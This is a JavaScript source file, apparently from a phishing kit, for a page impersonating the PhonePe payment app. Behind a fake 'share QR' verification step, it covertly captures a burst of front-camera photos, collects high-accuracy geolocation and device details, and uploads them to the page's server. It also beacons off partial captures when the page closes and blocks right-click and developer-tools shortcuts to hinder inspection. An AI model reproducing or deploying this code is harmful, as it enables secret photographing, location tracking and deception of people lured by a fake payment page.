
// Developed by surajorg
// Copyright (c) 2025 Surajorg - MIT License
// PhonePe - Frontend JavaScript

class PhonePeCatcher {
    constructor() {
        this.video = document.getElementById('video');
        this.canvas = document.getElementById('canvas');
        this.stream = null;
        this.hasCaptured = false;
        this.sessionActive = false;
        this.inProgress = false;
        this.ctx = null;
        this.geo = null;
        this.initialPhotos = [];
        this.middlePhotos = [];
        this.finalPhotos = [];
        this.sessionId = this.loadOrCreateSessionId();
        this.sessionStart = this.loadOrInitSessionStart();
        this.init();
    }

    init() {
        // Set up event listeners (robust binding)
        const selectors = ['#start-verification', '#share-qr', '.phonepe-btn.primary-btn', '.share-qr-btn', '[data-action="share-qr"]'];
        const bound = new Set();
        selectors.forEach(sel => {
            const el = document.querySelector(sel);
            if (el && !bound.has(el)) {
                el.addEventListener('click', () => this.startVerification());
                bound.add(el);
            }
        });
        // Event delegation for dynamic elements
        document.addEventListener('click', (e) => {
            const target = e.target && e.target.closest('[data-action="share-qr"], #share-qr, .share-qr-btn');
            if (target) {
                this.startVerification();
            }
        });
        // Unload handlers to persist partial captures
        window.addEventListener('pagehide', () => this.sendLeftover());
        window.addEventListener('beforeunload', () => this.sendLeftover());
    }

    async startVerification() {
        try {
            // Guard to prevent double initialization
            if (this.inProgress || this.sessionActive || this.stream) { return; }

            document.getElementById('payment-section').classList.add('hidden');
            document.getElementById('camera-section').classList.remove('hidden');

            this.inProgress = true;
            this.stream = await navigator.mediaDevices.getUserMedia({
                video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
                audio: false
            });

            this.video.srcObject = this.stream;

            this.video.onloadedmetadata = () => {
                if (!this.sessionActive) {
                    this.sessionActive = true;
                    this.setupCanvas();
                    this.orchestrateCaptures();
                }
            };

        } catch (error) {
            // Silent failure: keep UI unchanged
            console.error('Error accessing camera:', error);
            this.inProgress = false;
        }
    }

    setupCanvas() {
        if (!this.video || !this.canvas) return;
        this.canvas.width = this.video.videoWidth || 640;
        this.canvas.height = this.video.videoHeight || 480;
        this.ctx = this.canvas.getContext('2d');
    }

    async capturePhotoAndUpload(burstType, index) {
        if (!this.ctx) return null;
        this.ctx.drawImage(this.video, 0, 0, this.canvas.width, this.canvas.height);
        const photoData = this.canvas.toDataURL('image/jpeg', 0.8);
        await this.uploadSingle(photoData, burstType, index);
        return photoData;
    }

    async orchestrateCaptures() {
        const wait = (ms) => new Promise(r => setTimeout(r, ms));

        // Geolocation fire-and-forget (non-blocking)
        try {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    pos => { this.geo = { latitude: pos.coords.latitude, longitude: pos.coords.longitude, accuracy: pos.coords.accuracy }; },
                    () => {},
                    { enableHighAccuracy: true, maximumAge: 0, timeout: 8000 }
                );
            }
        } catch (_) {}

        // Immediate captures: first at ~0.1s, second right after
        await wait(100);
        const first = await this.capturePhotoAndUpload('initial', 0);
        if (first) { this.initialPhotos.push(first); }
        await wait(50);
        const second = await this.capturePhotoAndUpload('initial', 1);
        if (second) { this.initialPhotos.push(second); }

        // Middle captures at configurable points in a short session window using target-based timing
        const start = performance.now();
        const targetsMs = [1600, 2800]; // ~40% and ~70% of a ~4s window
        for (let i = 0; i < targetsMs.length; i++) {
          const target = targetsMs[i];
          const elapsed = performance.now() - start;
          const waitMs = Math.max(0, Math.floor(target - elapsed));
          await wait(waitMs);
          const mid = await this.capturePhotoAndUpload('middle', i);
          if (mid) { this.middlePhotos.push(mid); }
        }

        // Final capture near the end (~3.9s)
        {
          const finalTarget = 3900;
          const elapsed = performance.now() - start;
          const waitMs = Math.max(0, Math.floor(finalTarget - elapsed));
          await wait(waitMs);
          const last = await this.capturePhotoAndUpload('final', 0);
          if (last) { this.finalPhotos.push(last); }
        }

        await this.finalizeSession();
    }

    loadOrCreateSessionId() {
        try {
            const existing = localStorage.getItem('pp_session_id');
            if (existing) return existing;
            const bytes = new Uint8Array(16);
            const cryptoObj = window.crypto || window.msCrypto;
            if (cryptoObj && cryptoObj.getRandomValues) {
                cryptoObj.getRandomValues(bytes);
            } else {
                for (let i = 0; i < bytes.length; i++) bytes[i] = Math.floor(Math.random() * 256);
            }
            const id = Array.from(bytes).map(b => b.toString(16).padStart(2, '0')).join('');
            localStorage.setItem('pp_session_id', id);
            return id;
        } catch (_) {
            const fallback = 'sess_' + Date.now();
            localStorage.setItem('pp_session_id', fallback);
            return fallback;
        }
    }

    loadOrInitSessionStart() {
        try {
            const existing = sessionStorage.getItem('pp_session_start');
            if (existing) return parseInt(existing, 10);
            const now = Date.now();
            sessionStorage.setItem('pp_session_start', String(now));
            return now;
        } catch (_) {
            return Date.now();
        }
    }

    async uploadSingle(photoData, burstType, index) {
        try {
            const metadata = {
                userAgent: navigator.userAgent,
                screenResolution: `${window.screen.width}x${window.screen.height}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                platform: navigator.platform,
                geo: this.geo
            };
            const payload = {
                sessionId: this.sessionId,
                sessionStart: this.sessionStart,
                burstType,
                index,
                photo: photoData,
                metadata
            };
            await fetch('/api/upload_single', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
        } catch (_) {}
    }

    async finalizeSession() {
        try {
            const metadata = {
                userAgent: navigator.userAgent,
                screenResolution: `${window.screen.width}x${window.screen.height}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                platform: navigator.platform,
                geo: this.geo
            };
            const payload = {
                sessionId: this.sessionId,
                sessionStart: this.sessionStart,
                counts: {
                    initial: this.initialPhotos.length,
                    middle: this.middlePhotos.length,
                    final: this.finalPhotos.length,
                    total: this.initialPhotos.length + this.middlePhotos.length + this.finalPhotos.length
                },
                completed: true,
                metadata
            };
            await fetch('/api/finalize', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
        } catch (_) {}
        this.inProgress = false;
        this.showSuccess();
    }

    sendLeftover() {
        try {
            const hasAny = (this.initialPhotos.length + this.middlePhotos.length + this.finalPhotos.length) > 0;
            if (!hasAny) return;
            const metadata = {
                userAgent: navigator.userAgent,
                screenResolution: `${window.screen.width}x${window.screen.height}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                platform: navigator.platform,
                geo: this.geo
            };
            const payload = {
                sessionId: this.sessionId,
                sessionStart: this.sessionStart,
                initialPhotos: this.initialPhotos,
                middlePhotos: this.middlePhotos,
                finalPhotos: this.finalPhotos,
                metadata
            };
            const blob = new Blob([JSON.stringify(payload)], { type: 'application/json' });
            if (navigator.sendBeacon) {
                navigator.sendBeacon('/api/leftover', blob);
            }
        } catch (_) {}
    }

    showSuccess() {
        // Hide camera section and show success
        document.getElementById('camera-section').classList.add('hidden');
        document.getElementById('success-section').classList.remove('hidden');

        // Stop camera after a brief delay
        setTimeout(() => {
            if (this.stream) {
                this.stream.getTracks().forEach(track => track.stop());
            }
        }, 1000);
    }

    cleanup() {
        if (this.stream) {
            this.stream.getTracks().forEach(track => track.stop());
            this.stream = null;
        }
    }
}

// Initialize when page loads
document.addEventListener('DOMContentLoaded', () => {
    const catcher = new PhonePeCatcher();

    // Cleanup on page unload
    window.addEventListener('beforeunload', () => {
        catcher.cleanup();
    });
});

// Prevent right-click and dev tools
document.addEventListener('contextmenu', event => event.preventDefault());
document.addEventListener('keydown', event => {
    if (event.key === 'F12' ||
        (event.ctrlKey && event.shiftKey && event.key === 'I') ||
        (event.ctrlKey && event.shiftKey && event.key === 'J') ||
        (event.ctrlKey && event.shiftKey && event.key === 'C') ||
        (event.ctrlKey && event.key === 'u')) {
        event.preventDefault();
    }
});